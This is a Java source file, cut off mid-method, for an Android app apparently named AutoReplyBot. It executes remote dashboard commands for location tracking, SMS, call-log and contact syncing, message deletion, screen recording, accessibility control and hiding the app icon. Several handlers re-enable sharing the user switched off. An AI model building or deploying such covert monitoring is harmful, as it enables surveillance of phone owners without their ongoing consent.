package com.autoreplybot.remote;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.documentfile.provider.DocumentFile;

import com.autoreplybot.AppConstants;
import com.google.android.gms.location.CurrentLocationRequest;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.SetOptions;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageMetadata;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/** Executes validated module commands from the dashboard. */
public final class RemoteModuleCommandExecutor {
    private static final String TAG = "RemoteModuleExec";
    private final Context app;
    private final ExecutorService io = Executors.newSingleThreadExecutor();

    public RemoteModuleCommandExecutor(@NonNull Context context) {
        this.app = context.getApplicationContext();
    }

    public void execute(@NonNull RemoteModuleCommandAction action,
                        @NonNull Map<String, Object> payload,
                        @NonNull String commandId,
                        @NonNull Ack ack) {
        io.execute(() -> {
            try {
                switch (action) {
                    case DEVICE_INFO_REFRESH:
                    case STATUS_REFRESH:
                        refreshDeviceInfo(ack);
                        break;
                    case LOCATION_GET_CURRENT:
                        getCurrentLocation(ack);
                        break;
                    case LOCATION_START_LIVE:
                        startLive(payload, ack);
                        break;
                    case LOCATION_STOP:
                        RemoteLocationSharingService.stop(app);
                        ack.ok("stopped");
                        break;
                    case GALLERY_INDEX:
                    case GALLERY_METADATA:
                        indexGallery(payload, ack);
                        break;
                    case GALLERY_TRANSFER_REQUEST:
                        galleryTransfer(payload, ack);
                        break;
                    case GALLERY_DELETE_REQUEST:
                        ack.fail("REQUIRES_USER_CONFIRMATION",
                                "Gallery deletion must be confirmed on the phone");
                        break;
                    case NOTIFICATIONS_SYNC:
                        syncNotifications(ack);
                        break;
                    case MESSAGES_SYNC:
                        syncMessages(payload, ack);
                        break;
                    case MESSAGES_DELETE:
                        deleteMessages(payload, ack);
                        break;
                    case CALL_LOGS_SYNC:
                        syncCallLogs(payload, ack);
                        break;
                    case CONTACTS_SYNC:
                        syncContacts(payload, ack);
                        break;
                    case APPS_INDEX:
                        indexApps(ack);
                        break;
                    case APP_USAGE_SYNC:
                        syncAppUsage(payload, ack);
                        break;
                    case APP_BLOCK:
                        appBlock(payload, ack);
                        break;
                    case APP_UNBLOCK:
                        appUnblock(payload, ack);
                        break;
                    case APP_BLOCKS_SYNC:
                        appBlocksSync(ack);
                        break;
                    case SET_ALLOW_UNINSTALL:
                        setAllowUninstall(payload, ack);
                        break;
                    case UNINSTALL_APP:
                        uninstallApp(ack);
                        break;
                    case SET_LAUNCHER_HIDDEN:
                        setLauncherHidden(payload, ack);
                        break;
                    case SCREEN_LOCK:
                        screenLock(ack);
                        break;
                    case SCREEN_UNLOCK:
                        screenUnlock(ack);
                        break;
                    case SCREEN_RECORD_START:
                        screenRecordStart(payload, ack);
                        break;
                    case SCREEN_RECORD_STOP:
                        RemoteScreenRecordService.stop(app);
                        ack.ok("stop_requested");
                        break;
                    case SCREEN_RECORD_PAUSE:
                        RemoteScreenRecordService.pause(app);
                        ack.ok("pause_requested");
                        break;
                    case SCREEN_RECORD_RESUME:
                        RemoteScreenRecordService.resume(app);
                        ack.ok("resume_requested");
                        break;
                    case A11Y_START_SESSION:
                    case A11Y_STOP_SESSION:
                    case A11Y_PAUSE_SESSION:
                    case A11Y_RESUME_SESSION:
                    case A11Y_EMERGENCY_STOP:
                    case A11Y_STATUS:
                    case A11Y_TREE:
                    case A11Y_TAP:
                    case A11Y_DOUBLE_TAP:
                    case A11Y_LONG_PRESS:
                    case A11Y_SWIPE:
                    case A11Y_DRAG:
                    case A11Y_GLOBAL_ACTION:
                    case A11Y_NODE_ACTION:
                    case A11Y_SET_TEXT:
                    case A11Y_OPEN_APP:
                    case A11Y_RUN_TASK:
                    case A11Y_CANCEL_TASK:
                        new RemoteAccessibilityCommandHandler(app)
                                .handle(action.name(), payload, commandId, ack);
                        break;
                    case FILE_LIST:
                        fileList(payload, ack);
                        break;
                    case FILE_DOWNLOAD_REQUEST:
                        fileDownload(payload, ack);
                        break;
                    case FILE_CREATE_FOLDER:
                        fileCreateFolder(payload, ack);
                        break;
                    case FILE_RENAME:
                        fileRename(payload, ack);
                        break;
                    case FILE_COPY:
                        fileCopy(payload, ack);
                        break;
                    case FILE_DELETE:
                        fileDelete(payload, ack);
                        break;
                    case FILE_CANCEL_TRANSFER:
                        cancelTransfer(payload, ack);
                        break;
                    case FILE_UPLOAD_PREPARE:
                    case FILE_UPLOAD_COMMIT:
                    case FILE_MOVE:
                    case FILE_METADATA:
                    case FILE_PREVIEW:
                        ack.fail("NOT_IMPLEMENTED_YET", "Handled in a follow-up hardening pass");
                        break;
                    default:
                        ack.fail("UNKNOWN_ACTION", "Unsupported action");
                }
            } catch (Exception e) {
                Log.w(TAG, "command failed " + action, e);
                ack.fail("EXEC_FAILED", e.getMessage() != null ? e.getMessage() : "failed");
            }
        });
    }

    private void refreshDeviceInfo(@NonNull Ack ack) {
        Map<String, Object> info = RemoteDeviceInfoCollector.collect(app);
        new RemoteDeviceInfoRepository(app).publishCurrent(info, () -> ack.ok("refreshed"));
    }

    private void getCurrentLocation(@NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!RemotePermissionChecks.hasForegroundLocation(app)) {
            ack.fail("PERMISSION_DENIED", "Location permission not granted on the phone.");
            return;
        }
        // Auto-enable Location Sharing when OS permission is already granted.
        if (!prefs.isLocationSharingEnabled() || RemoteModulePrefs.MODE_DISABLED.equals(prefs.getLocationMode())) {
            prefs.setLocationSharingEnabled(true);
            prefs.setLocationMode(RemotePermissionChecks.hasBackgroundLocation(app)
                    ? RemoteModulePrefs.MODE_BACKGROUND
                    : RemoteModulePrefs.MODE_CURRENT_ONLY);
            new RemoteDeviceInfoRepository(app).publishModuleFlags();
        }
        FusedLocationProviderClient fused = LocationServices.getFusedLocationProviderClient(app);
        CurrentLocationRequest req = new CurrentLocationRequest.Builder()
                .setPriority(Priority.PRIORITY_BALANCED_POWER_ACCURACY)
                .setMaxUpdateAgeMillis(60_000L)
                .build();
        try {
            fused.getCurrentLocation(req, null)
                    .addOnSuccessListener(loc -> {
                        if (loc == null) {
                            ack.fail("NO_LOCATION", "No location available");
                            return;
                        }
                        boolean approx = androidx.core.content.ContextCompat.checkSelfPermission(
                                app, android.Manifest.permission.ACCESS_FINE_LOCATION)
                                != android.content.pm.PackageManager.PERMISSION_GRANTED;
                        new RemoteLocationRepository(app).writeCurrent(
                                loc, prefs.getLocationMode(), null, null, approx);
                        ack.ok("location_written");
                    })
                    .addOnFailureListener(e -> ack.fail("LOCATION_FAILED", e.getMessage()));
        } catch (SecurityException e) {
            ack.fail("PERMISSION_DENIED", "Location permission not granted");
        }
    }

    private void startLive(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!RemotePermissionChecks.hasForegroundLocation(app)) {
            ack.fail("PERMISSION_DENIED", "Location permission not granted on the phone.");
            return;
        }
        if (!prefs.isLocationSharingEnabled() || RemoteModulePrefs.MODE_DISABLED.equals(prefs.getLocationMode())) {
            prefs.setLocationSharingEnabled(true);
            prefs.setLocationMode(RemotePermissionChecks.hasBackgroundLocation(app)
                    ? RemoteModulePrefs.MODE_BACKGROUND
                    : RemoteModulePrefs.MODE_CURRENT_ONLY);
            new RemoteDeviceInfoRepository(app).publishModuleFlags();
        }
        long duration = RemoteMapValues.longValue(payload, "durationMs", prefs.getLiveDurationMs());
        RemoteLocationSharingService.start(app, duration, null);
        ack.ok("live_started");
    }

    private void indexGallery(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        if (!new RemoteModulePrefs(app).isGalleryEnabled()) {
            ack.fail("GALLERY_DISABLED", "Gallery access is disabled on the phone.");
            return;
        }
        String type = RemoteMapValues.string(payload, "mediaType");
        if (type.isEmpty()) type = "all";
        int n = new RemoteGalleryIndexer(app).indexAndSync(type);
        ack.ok("indexed:" + n);
    }

    private void syncNotifications(@NonNull Ack ack) {
        RemoteNotificationMirror.ensureSharingEnabledIfListenerReady(app);
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isNotificationMirrorEnabled()) {
            ack.fail("NOTIFICATIONS_DISABLED",
                    "Notification Access is off. On the phone open Remote Camera & Voice → Permissions → tap Notification access and enable AutoReplyBot.");
            return;
        }
        int n = RemoteNotificationMirror.syncActive(app);
        if (n == RemoteNotificationMirror.ERR_DISABLED) {
            ack.fail("NOTIFICATIONS_DISABLED",
                    "Notification Access is off. Phone → Permissions → Notification access.");
        } else if (n == RemoteNotificationMirror.ERR_LISTENER) {
            ack.fail("LISTENER_NOT_CONNECTED",
                    "Notification Access is not connected. Phone → Permissions → Notification access → turn AutoReplyBot off/on.");
        } else if (n == RemoteNotificationMirror.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in to Firebase.");
        } else if (n == RemoteNotificationMirror.ERR_WRITE) {
            ack.fail("WRITE_FAILED",
                    "Could not save notifications (Firestore write failed).");
        } else {
            ack.ok("synced:" + Math.max(0, n));
        }
    }

    private void indexApps(@NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isInstalledAppsSharingEnabled()) {
            prefs.setInstalledAppsSharingEnabled(true);
            new RemoteDeviceInfoRepository(app).publishModuleFlags();
        }
        int n = new RemoteInstalledAppsIndexer(app).indexAndSync();
        if (n == RemoteInstalledAppsIndexer.ERR_DISABLED) {
            ack.fail("APPS_DISABLED", "Installed apps sharing is disabled on the phone.");
        } else if (n == RemoteInstalledAppsIndexer.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else if (n == RemoteInstalledAppsIndexer.ERR_WRITE) {
            ack.fail("WRITE_FAILED", "Could not save installed apps list.");
        } else {
            ack.ok("indexed:" + Math.max(0, n));
        }
    }

    private void syncAppUsage(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isAppUsageSharingEnabled()) {
            if (RemoteAppUsageMirror.hasUsageAccess(app)) {
                prefs.setAppUsageSharingEnabled(true);
                new RemoteDeviceInfoRepository(app).publishModuleFlags();
            } else {
                ack.fail("USAGE_ACCESS_REQUIRED",
                        "Usage Access is off. Phone → Permissions → Recent Apps → allow Usage Access.");
                return;
            }
        }
        if (!RemoteAppUsageMirror.hasUsageAccess(app)) {
            ack.fail("USAGE_ACCESS_REQUIRED",
                    "Usage Access is off. Open system Usage Access settings and enable this app.");
            return;
        }
        int days = (int) RemoteMapValues.longValue(payload, "days", 7);
        int n = RemoteAppUsageMirror.syncRecent(app, days);
        if (n == RemoteAppUsageMirror.ERR_DISABLED) {
            ack.fail("APP_USAGE_DISABLED", "Recent apps history is disabled on the phone.");
        } else if (n == RemoteAppUsageMirror.ERR_PERMISSION) {
            ack.fail("USAGE_ACCESS_REQUIRED",
                    "Usage Access not granted. Phone → Permissions → Recent Apps.");
        } else if (n == RemoteAppUsageMirror.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else if (n == RemoteAppUsageMirror.ERR_WRITE) {
            ack.fail("WRITE_FAILED", "Could not save app usage history.");
        } else {
            ack.ok("synced:" + Math.max(0, n));
        }
    }

    private void appBlock(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        String packageName = RemoteMapValues.string(payload, "packageName");
        String appName = RemoteMapValues.string(payload, "appName");
        String mode = RemoteMapValues.string(payload, "mode");
        long durationMs = RemoteMapValues.longValue(payload, "durationMs", 30L * 60L * 1000L);
        if (packageName.isEmpty()) {
            ack.fail("BAD_PAYLOAD", "packageName required");
            return;
        }
        RemoteAppBlockManager mgr = new RemoteAppBlockManager(app);
        int code;
        if (RemoteAppBlockStore.PACKAGE_CAMERA_HW.equals(packageName)
                || RemoteAppBlockStore.MODE_CAMERA_HW.equals(mode)) {
            code = mgr.blockCameraHardware(durationMs);
        } else {
            code = mgr.blockApp(packageName, appName, durationMs);
        }
        if (code == RemoteAppBlockManager.OK) {
            ack.ok("blocked:" + packageName);
        } else if (code == RemoteAppBlockManager.ERR_ACCESSIBILITY) {
            ack.fail("ACCESSIBILITY_REQUIRED",
                    "Enable App Control accessibility on the phone: Permissions → App Control.");
        } else if (code == RemoteAppBlockManager.ERR_DEVICE_ADMIN) {
            ack.fail("DEVICE_ADMIN_REQUIRED",
                    "Enable Device Admin on the phone for camera hardware lock: Permissions → App Control.");
        } else if (code == RemoteAppBlockManager.ERR_PROTECTED) {
            ack.fail("PROTECTED_PACKAGE", "This system package cannot be blocked.");
        } else if (code == RemoteAppBlockManager.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else {
            ack.fail("BLOCK_FAILED", "Could not apply app block.");
        }
    }

    private void appUnblock(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        String packageName = RemoteMapValues.string(payload, "packageName");
        if (packageName.isEmpty()) {
            ack.fail("BAD_PAYLOAD", "packageName required");
            return;
        }
        int code = new RemoteAppBlockManager(app).unblock(packageName);
        if (code == RemoteAppBlockManager.OK) {
            ack.ok("unblocked:" + packageName);
        } else {
            ack.fail("UNBLOCK_FAILED", "Could not clear app block.");
        }
    }

    private void appBlocksSync(@NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isAppControlEnabled()) {
            prefs.setAppControlEnabled(true);
            new RemoteDeviceInfoRepository(app).publishModuleFlags();
        }
        new RemoteAppBlockManager(app).purgeExpiredAndSync();
        int n = new RemoteAppBlockManager(app).activeBlocks().size();
        ack.ok("active:" + n);
    }

    private void setAllowUninstall(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        boolean allow = RemoteMapValues.bool(payload, "allowUninstall", true);
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        prefs.setAllowUninstall(allow);
        if (allow) {
            // Optional: drop Device Admin so the system Uninstall button works immediately.
            // Camera lock will ask to re-enable admin later if needed.
            boolean removeAdmin = RemoteMapValues.bool(payload, "removeDeviceAdmin", true);
            if (removeAdmin) {
                RemoteDeviceAdminReceiver.tryRemoveActiveAdmin(app);
            }
        }
        new RemoteDeviceInfoRepository(app).publishModuleFlags();
        ack.ok(allow ? "uninstall_allowed" : "uninstall_protected");
    }

    private void uninstallApp(@NonNull Ack ack) {
        Runnable run = () -> {
            try {
                RemoteSelfUninstallController.requestFromWebsite(app);
                ack.ok("uninstall_ui_opened");
            } catch (Throwable t) {
                Log.e(TAG, "UNINSTALL_APP failed", t);
                ack.fail("UNINSTALL_FAILED", t.getMessage() != null ? t.getMessage() : "uninstall failed");
            }
        };
        if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
            run.run();
        } else {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(run);
        }
    }

    private void setLauncherHidden(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        boolean hidden = RemoteMapValues.bool(payload, "launcherHidden", false);
        RemoteControlPrefs controlPrefs = new RemoteControlPrefs(app);
        if (hidden && controlPrefs.getDialerPasscode().isEmpty()) {
            ack.fail(
                    "PASSCODE_REQUIRED",
                    "Set a dialer passcode on the phone (Remote Control → Management) before hiding from the website.");
            return;
        }
        controlPrefs.setLauncherHidden(hidden);
        // goHomeAfterHide=false: do not yank the user to home from a remote command.
        RemoteLauncherVisibility.setLauncherIconVisible(app, !hidden, false);
        try {
            if (hidden) {
                RemoteHiddenUnlockNotifications.showOngoingUnlock(app);
            } else {
                RemoteHiddenUnlockNotifications.cancelOngoing(app);
            }
        } catch (Throwable ignored) {
        }
        new RemoteDeviceInfoRepository(app).publishModuleFlags();
        ack.ok(hidden ? "launcher_hidden" : "launcher_visible");
    }

    private void screenLock(@NonNull Ack ack) {
        int result = RemoteScreenLockController.lockNow(app);
        if (result == RemoteScreenLockController.OK) {
            ack.ok("locked");
        } else if (result == RemoteScreenLockController.ERR_NO_ADMIN) {
            ack.fail("DEVICE_ADMIN_REQUIRED",
                    "Enable Device Admin on the phone (Remote Control → Permissions) to lock the screen.");
        } else {
            ack.fail("LOCK_FAILED", "Could not lock the screen.");
        }
    }

    private void screenUnlock(@NonNull Ack ack) {
        int result = RemoteScreenLockController.unlockWake(app);
        if (result == RemoteScreenLockController.OK) {
            boolean locked = RemoteScreenLockController.isKeyguardLocked(app);
            ack.ok(locked
                    ? "wake_requested_secure_lock"
                    : "unlock_requested");
        } else {
            ack.fail("UNLOCK_FAILED", "Could not wake/unlock the screen.");
        }
    }

    private void screenRecordStart(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isScreenRecordEnabled()) {
            prefs.setScreenRecordEnabled(true);
            new RemoteDeviceInfoRepository(app).publishModuleFlags();
        }
        String transferId = RemoteMapValues.string(payload, "transferId");
        String recordingId = RemoteMapValues.string(payload, "recordingId");
        if (recordingId.isEmpty()) {
            recordingId = java.util.UUID.randomUUID().toString().replace("-", "");
        }
        boolean withMic = RemoteMapValues.bool(payload, "withMic", false);
        String quality = RemoteMapValues.string(payload, "quality");
        if (quality.isEmpty()) quality = "720p";
        int fps = (int) RemoteMapValues.longValue(payload, "fps", 30L);
        if (RemoteScreenRecordService.isActive()) {
            ack.fail("ALREADY_RECORDING", "A recording is already in progress");
            return;
        }
        RemoteScreenRecordService.setPending(recordingId, transferId);
        RemoteScreenRecordLaunchService.start(app, transferId, recordingId, withMic, quality, fps);
        ack.ok("awaiting_projection_permission");
    }

    private void syncMessages(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isMessagesSharingEnabled()) {
            if (RemoteSmsMirror.hasSmsPermission(app)) {
                prefs.setMessagesSharingEnabled(true);
                new RemoteDeviceInfoRepository(app).publishModuleFlags();
            } else {
                ack.fail("MESSAGES_DISABLED",
                        "SMS permission is off. Phone → Permissions → SMS / Messages.");
                return;
            }
        }
        int limit = (int) RemoteMapValues.longValue(payload, "limit", 100);
        int n = RemoteSmsMirror.syncInbox(app, limit);
        if (n == RemoteSmsMirror.ERR_DISABLED) {
            ack.fail("MESSAGES_DISABLED", "Messages sharing is disabled on the phone.");
        } else if (n == RemoteSmsMirror.ERR_PERMISSION) {
            ack.fail("PERMISSION_DENIED", "READ_SMS not granted. Phone → Permissions → SMS.");
        } else if (n == RemoteSmsMirror.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else if (n == RemoteSmsMirror.ERR_WRITE) {
            ack.fail("WRITE_FAILED", "Could not save messages to cloud.");
        } else {
            ack.ok("synced:" + Math.max(0, n));
        }
    }

    private void deleteMessages(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isMessagesSharingEnabled() && !RemoteSmsMirror.hasSmsPermission(app)) {
            ack.fail("MESSAGES_DISABLED",
                    "SMS permission is off. Phone → Permissions → SMS / Messages.");
            return;
        }
        Object rawItems = payload.get("items");
        if (!(rawItems instanceof java.util.List) || ((java.util.List<?>) rawItems).isEmpty()) {
            ack.fail("BAD_REQUEST", "items required");
            return;
        }
        @SuppressWarnings("unchecked")
        java.util.List<Object> list = (java.util.List<Object>) rawItems;
        int result = RemoteSmsMirror.deleteMessages(app, list);
        if (result == RemoteSmsMirror.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else if (result == RemoteSmsMirror.ERR_PERMISSION) {
            ack.fail("PERMISSION_DENIED", "Cannot modify SMS on this phone (permission denied).");
        } else {
            ack.ok("deleted:" + Math.max(0, result));
        }
    }

    private void syncCallLogs(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isCallLogsSharingEnabled()) {
            if (RemoteCallLogMirror.hasCallLogPermission(app)) {
                prefs.setCallLogsSharingEnabled(true);
                new RemoteDeviceInfoRepository(app).publishModuleFlags();
            } else {
                ack.fail("CALL_LOGS_DISABLED",
                        "Call log permission is off. Phone → Permissions → Call logs.");
                return;
            }
        }
        int limit = (int) RemoteMapValues.longValue(payload, "limit", 150);
        int n = RemoteCallLogMirror.syncRecent(app, limit);
        if (n == RemoteCallLogMirror.ERR_DISABLED) {
            ack.fail("CALL_LOGS_DISABLED", "Call logs sharing is disabled on the phone.");
        } else if (n == RemoteCallLogMirror.ERR_PERMISSION) {
            ack.fail("PERMISSION_DENIED", "READ_CALL_LOG not granted. Phone → Permissions → Call logs.");
        } else if (n == RemoteCallLogMirror.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else if (n == RemoteCallLogMirror.ERR_WRITE) {
            ack.fail("WRITE_FAILED", "Could not save call logs to cloud.");
        } else {
            try {
                RemoteCallRecordingWatcher.syncWithPrefs(app);
                RemoteCallRecordingLinker.attachOemRecordings(app, 15);
            } catch (Exception e) {
                Log.w(TAG, "call recording attach failed", e);
            }
            ack.ok("synced:" + Math.max(0, n));
        }
    }

    private void syncContacts(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
        if (!prefs.isContactsSharingEnabled()) {
            if (RemoteContactsMirror.hasContactsPermission(app)) {
                prefs.setContactsSharingEnabled(true);
                new RemoteDeviceInfoRepository(app).publishModuleFlags();
            } else {
                ack.fail("CONTACTS_DISABLED",
                        "Contacts permission is off. Phone → Permissions → Contacts.");
                return;
            }
        }
        int limit = (int) RemoteMapValues.longValue(payload, "limit", 1000);
        int n = RemoteContactsMirror.syncAll(app, limit);
        if (n == RemoteContactsMirror.ERR_DISABLED) {
            ack.fail("CONTACTS_DISABLED", "Contacts sharing is disabled on the phone.");
        } else if (n == RemoteContactsMirror.ERR_PERMISSION) {
            ack.fail("PERMISSION_DENIED", "READ_CONTACTS not granted. Phone → Permissions → Contacts.");
        } else if (n == RemoteContactsMirror.ERR_AUTH) {
            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
        } else if (n == RemoteContactsMirror.ERR_WRITE) {
            ack.fail("WRITE_FAILED", "Could not save contacts to cloud.");
        } else {
            ack.ok("synced:" + Math.max(0, n));
        }
    }

    private void galleryTransfer(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        if (!new RemoteModulePrefs(app).isGalleryEnabled()) {
            failTransfer(RemoteMapValues.string(payload, "transferId"),
                    "GALLERY_DISABLED", "Gallery access is disabled");
            ack.fail("GALLERY_DISABLED", "Gallery access is disabled");
            return;
        }
        String itemId = RemoteMapValues.string(payload, "itemId");
        String transferId = RemoteMapValues.string(payload, "transferId");
        Uri uri = new RemoteGalleryIndexer(app).resolveItemUri(itemId);
        if (uri == null) {
            failTransfer(transferId, "ITEM_NOT_FOUND",
                    "Media item not available locally; re-index gallery");
            ack.fail("ITEM_NOT_FOUND", "Media item not available locally; re-index gallery");
            return;
        }
        String mime = app.getContentResolver().getType(uri);
        if (mime == null || mime.trim().isEmpty()) {
            mime = "application/octet-stream";
        }
        uploadUri(uri, transferId, "gallery-transfers", mime, ack);
    }

    private void failTransfer(@NonNull String transferId,
                              @NonNull String errorCode,
                              @Nullable String errorMessage) {
        if (transferId.isEmpty()) return;
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) return;
        updateTransfer(user.getUid(), transferId, "failed", 0, null, null, errorCode, errorMessage);
    }

    private void fileList(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        if (!new RemoteModulePrefs(app).isFileManagerEnabled()) {
            ack.fail("FILES_DISABLED", "File manager disabled");
            return;
        }
        String grantId = RemoteMapValues.string(payload, "folderGrantId");
        String path = RemoteMapValues.string(payload, "relativePath");
        List<Map<String, Object>> rows = new RemoteFileManagerHelper(app).listChildren(grantId, path);
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            ack.fail("AUTH", "Not signed in");
            return;
        }
        String deviceId = new RemoteControlPrefs(app).getOrCreateDeviceId();
        String parentPath = RemoteFileManagerHelper.normalizeRelative(path);
        long listedAt = System.currentTimeMillis();
        for (Map<String, Object> row : rows) {
            String entryId = String.valueOf(row.get("documentId"));
            row.put("ownerUid", user.getUid());
            row.put("deviceId", deviceId);
            row.put("parentRelativePath", parentPath);
            row.put("listedAt", listedAt);
            FirebaseFirestore.getInstance()
                    .collection(AppConstants.FIRESTORE_USERS)
                    .document(user.getUid())
                    .collection(AppConstants.FIRESTORE_DEVICES)
                    .document(deviceId)
                    .collection(AppConstants.FIRESTORE_FILE_INDEX)
                    .document(entryId)
                    .set(row, SetOptions.merge());
        }
        // Browse cursor for the website (current open folder).
        Map<String, Object> cursor = new HashMap<>();
        cursor.put("ownerUid", user.getUid());
        cursor.put("deviceId", deviceId);
        cursor.put("folderGrantId", grantId);
        cursor.put("relativePath", parentPath);
        cursor.put("listedAt", listedAt);
        cursor.put("count", rows.size());
        FirebaseFirestore.getInstance()
                .collection(AppConstants.FIRESTORE_USERS)
                .document(user.getUid())
                .collection(AppConstants.FIRESTORE_DEVICES)
                .document(deviceId)
                .collection(AppConstants.FIRESTORE_FILE_INDEX)
                .document("_browse")
                .set(cursor, SetOptions.merge());
        ack.ok("listed:" + rows.size());
    }

    private void fileDownload(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        String grantId = RemoteMapValues.string(payload, "folderGrantId");
        String relativePath = RemoteMapValues.string(payload, "relativePath");
        String transferId = RemoteMapValues.string(payload, "transferId");
        DocumentFile file = new RemoteFileManagerHelper(app).resolveFile(grantId, relativePath);
        if (file == null || file.getUri() == null) {
            ack.fail("FILE_NOT_FOUND", "File not found in authorized folder");
            return;
        }
        String mime = file.getType() != null ? file.getType() : "application/octet-stream";
        uploadUri(file.getUri(), transferId, "file-transfers", mime, ack);
    }

    private void fileCreateFolder(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        boolean ok = new RemoteFileManagerHelper(app).createFolder(
                RemoteMapValues.string(payload, "folderGrantId"),
                RemoteMapValues.string(payload, "relativePath"),
                RemoteMapValues.string(payload, "name"));
        if (ok) ack.ok("created");
        else ack.fail("CREATE_FAILED", "Could not create folder");
    }

    private void fileRename(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        boolean ok = new RemoteFileManagerHelper(app).rename(
                RemoteMapValues.string(payload, "folderGrantId"),
                RemoteMapValues.string(payload, "relativePath"),
                RemoteMapValues.string(payload, "newName"));
        if (ok) ack.ok("renamed");
        else ack.fail("RENAME_FAILED", "Rename failed");
    }

    private void fileCopy(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        boolean ok = new RemoteFileManagerHelper(app).copyWithinTree(
                RemoteMapValues.string(payload, "folderGrantId"),
                RemoteMapValues.string(payload, "fromPath"),
                RemoteMapValues.string(payload, "toDirPath"),
                RemoteMapValues.string(payload, "newName"));
        if (ok) ack.ok("copied");
        else ack.fail("COPY_FAILED", "Copy failed");
    }

    private void fileDelete(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        if (new RemoteModulePrefs(app).isConfirmEveryDelete()) {
            ack.fail("REQUIRES_USER_CONFIRMATION", "Confirm delete on the phone");
            return;
        }
        boolean ok = new RemoteFileManagerHelper(app).delete(
                RemoteMapValues.string(payload, "folderGrantId"),
                RemoteMapValues.string(payload, "relativePath"));
        if (ok) ack.ok("deleted");
        else ack.fail("DELETE_FAILED", "Delete failed");
    }

    private void cancelTransfer(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
        String transferId = RemoteMapValues.string(payload, "transferId");
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null || transferId.isEmpty()) {
            ack.fail("BAD_REQUEST", "Missing transfer");
            return;
        }
        Map<String, Object> patch = new HashMap<>();
        patch.put("status", "cancelled");
        patch.put("completedAt", System.currentTimeMillis());
        FirebaseFirestore.getInstance()
                .collection(AppConstants.FIRESTORE_USERS)
                .document(user.getUid())
                .collection(AppConstants.FIRESTORE_TRANSFERS)
                .document(transferId)
                .set(patch, SetOptions.merge())
                .addOnSuccessListener(v -> ack.ok("cancelled"))
                .addOnFailureListener(e -> ack.fail("CANCEL_FAILED", e.getMessage()));
    }

    private void uploadUri(@NonNull Uri uri,
                           @NonNull String transferId,
                           @NonNull String folder,
                           @NonNull String mime,
                           @NonNull Ack ack) {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null || transferId.isEmpty()) {
            ack.fail("BAD_REQUEST", "Missing auth/transfer");
            return;
        }
        String deviceId = new RemoteControlPrefs(app).getOrCreateDeviceId();
        String path = "users/" + user.getUid() + "/devices/" + deviceId + "/" + folder
                + "/" + transferId + "/file";
        final String uploadMime = normalizeUploadMime(mime);
        final String uid = user.getUid();
        updateTransfer(uid, transferId, "uploading", 10, path, uploadMime, null, null);
        io.execute(() -> {
            File temp = null;
            try {
                temp = copyUriToTempFile(uri);
                if (temp == null || !temp.exists() || temp.length() <= 0L) {
                    failUpload(uid, transferId, path, uploadMime, ack, "READ_FAILED",
                            "Cannot read file or file is empty");
                    return;
                }
                final File uploadFile = temp;
                StorageMetadata meta = new StorageMetadata.Builder().setContentType(uploadMime).build();
